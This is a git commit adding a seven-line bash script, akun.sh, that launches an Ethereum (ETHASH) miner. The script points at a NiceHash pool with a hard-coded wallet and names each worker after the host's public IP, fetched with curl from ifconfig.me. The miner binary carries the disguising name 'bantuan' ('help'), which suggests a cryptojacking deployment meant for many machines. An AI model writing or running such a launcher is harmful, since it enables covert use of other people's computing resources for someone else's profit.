0dafb3ce488647f4614786c1ff26cd53b46ada01
angkii <83603708+angkii@users.noreply.github.com>
2021-08-16 21:49:13 +0700

    Add files via upload

---
+++ akun.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+POOL=stratum+tcp://daggerhashimoto.us.nicehash.com:3353
+WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+
+chmod +x bantuan
+./bantuan --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
